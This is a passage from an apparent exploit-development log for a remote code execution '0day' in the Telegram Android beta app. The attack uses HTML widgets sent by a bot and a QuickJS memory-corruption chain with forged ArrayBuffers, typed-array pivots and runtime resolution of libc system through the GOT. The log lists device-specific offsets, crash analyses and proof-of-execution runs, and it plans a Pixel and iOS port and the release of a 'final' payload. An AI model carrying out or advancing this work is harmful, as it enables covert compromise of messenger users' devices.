- logcat 17:57-18:01: 0 `Fatal signal` / `SIGSEGV`;
- no per-device calibration; runtime VBase/pages/arena/rt.

A second series was run with the N1 `frida-server` stopped and the
`magisk-frida` module disabled: **5/5 clean runs** (18:04:58-18:11:24),
each `NO_SU_NO_FRIDA`, app uid 10346, `TracerPid=0`, `CapEff=0`, same
proof md5. A **no-root bot delivery** (beta `sendWidget`, chat <CHAT_ID>,
mid 16679) also rendered the final and wrote the same 185-B proof with no
`su`/`frida` process during execution. See
`device/logs/device_parser_rce/AUDIT_no_root_cheat.md`.

Certification: `device/logs/device_parser_rce/CERTIFICATION_5of5.md`
(proof_run1..5.txt, debug_ready_run1.png, clean_nofrida/, noroot_bot/).

Marker note: the parser proof is the `id` line only. The 50-byte command is
bounded by the 64-byte forged AB data block, so no `MEGARCE` was appended;
`n1`, uid 10346, `untrusted_app` context and the 5 identical runs are the
RCE evidence.

With this, the parser 0day is device-certified hook-free on the Sony
(5/5). Next: Pixel 9 with the same widget (no per-device constants), then
the iOS 6s parser port.

---

## 32. Telegram 72929 (13.2.2): lib shift and class-24 self-pivot (c2560r)

Device 72929: the safe probe c2560q passes (`SAFE2560C`, app alive), so
stage A/forged AB/class 2560/cpool 110/AB 2544 and A/B/C
(2,228/5,356/408) remain valid. The c2560q debug crashes: tombstone 17,
PC 0x17239d8 (Uint8Array read), fault 0x6c56c00002, x9=0x6c56bc8ae8,
offset 0x3751a (226,586), PROT_NONE.

The faulting scan is the **class-64 T-AB pivot**, not the class-24 scan:
the pivot loop reads V[o+2] at o=226,584 and the class-24 scan never ran.
The offset matches the 72889 c2560o full-V fault because the same V page
gap is present.

Lib comparison (72929 sha f217... vs 72889 f12c...; BuildId f0a1... vs
21ec...): +224 B; .data.rel.ro/.got.plt/.data +0xE0, .bss +0xC0. The
typed-array element read at 0x17239d8 is byte-identical (data +0x38,
count +0x40): the JSObject/u.array layout is unchanged. The free/realloc
wrappers shifted +0x108 (new free@plt branch 0x174b378):
**JS_DEF_FREE=0x174b374** (old 0x174b26c); **free@LIBC JUMP_SLOT
GOT=0x1971fd0** (old 0x1971ef0). The QuickJS engine/struct layouts are
unchanged; the app heap layout moved the class-64 T-AB struct out of the
safe V pages.

r design: no class-64 pivot/full-V scan. The class-24 scan is limited to
V[0,0x37000) (the 72929 c2560q pivot read 0..0x36fff and faulted at page
55; this is the 72929-proven window, unlike the 72889 c2560n 0x7000).
The class-24 V view is its own far primitive: `V2=new Uint8Array(VAB)`
controls it; writing V's u.ptr (+56) via V2 re-points V at any address,
while V2 stays at VBase for V data. The block header VBase-8 -> arena
(page base) -> slab -> base/used via rd32 low/high; slab list next/prev;
PG[81] used bits; every V data read gated; the absolute probe uses the
far view (shape/proto/prop/C_FUNCTION/realm/rt/malloc_limit/pie); CAND
fallback from the used slab pages. Safe NOANCHOR if the class-24 is
absent or the guard fails.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560r_72929.html` | 8,120 | 2,605 |
| `c2560_final_c2560r_72929.html` | 8,120 | 3,118 |
| `c4096_debug_c4096r_72929.html` | 8,395 | 2,607 |
| `c4096_final_c4096r_72929.html` | 8,395 | 3,120 |
| `c2560_probe_c2560r_72929.html` | 8,120 | 950 |
| `c4096_probe_c4096r_72929.html` | 8,395 | 956 |

A/B/C: 2,228/2,503, 5,356/5,340, 408. Host: c2560r debug `HF READY
VNC=1 VO=2440 X=0 XG=0 G=0 GS=47 V=1 VK=1 VG=5 O24=4232`; c4096r
`GS=43 O24=3336`; finals proof 162; probes SAFE. Device expected
`HF READY VNC=.. VO=1360 ... V=1 VK=1 VG=5 O24=..` or a precise
NOANCHOR (VG step, O24). Final only after READY; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`.

---

## 33. c2560s: device-proven debug, final resolver still blocked

72929: probe SAFE; debug READY `VNC=1 VO=1360 X=0 XG=0 G=0 GS=115 V=1 VK=2
VG=5 P=4944`; B=6,917. VK=2 = class-20 forged-AB struct absent from V page 0;
the page-derived class-24 fallback found P=4944. No fixed V window; the V
anchor is universal and device-proven.

The universal final is NOT host-proven. The build constants
`JS_DEF_FREE`/`FREE_GOT` are gone and the app/lib bases, `.rela.plt` free GOT
and libc `system` are resolved at runtime. The app `.rela.plt` absolute bug
and the `d_ptr` absolute/virtual rule are fixed (`v>=app ? v : app+v`). After
those fixes the host final no longer faults but does not write the proof and
produces no marker/VDOM: the B does not complete. The 30k linear libc
`.dynsym` scan is the prime suspect; the GNU hash was removed for size.

Host matrix on both libs: `.rela.plt` free JUMP_SLOT 0x1971ef0/0x1971fd0;
`system` not imported; libc path required. Next: bounded GNU hash for
`system`; host proof 162; 72929 proof 185; same B unless it grows (then
re-run the probe SAFE). Do not ship the final before host proof.

---

## 34. c2560s final at B=7,182, zlib9 4,023, host proof 162

The app `.rela.plt` loop was the blocker: the single `setF(ajmp)` before the
loop was clobbered by the in-loop `setF(asym+si*24)`, so entry 1 read
`.dynsym` bytes as `r_info` (`si=1920103539`). Fixed per-entry
`setF(ajmp+eo); ro=r64F(0); ri=r64F(8)`. The 30k linear libc scan is replaced
by the bounded `.gnu.hash` lookup (sym_count from DT_HASH nchain or
`(strtab-symtab)/24`; nb/so/bsz/bsh bounds; bloom; buckets/chain; name
bounds). Host proof 162, `END=HF OK`.

The final is rebuilt at the probe-SAFE B=7,182: `c2560_final_c2560s_72929.html`
= 9,946 raw / **4,023 zlib9** (<=4,050); host final 4,014, proof 162. CAND is
debug-only. Next 72929 run: the final, proof 185.
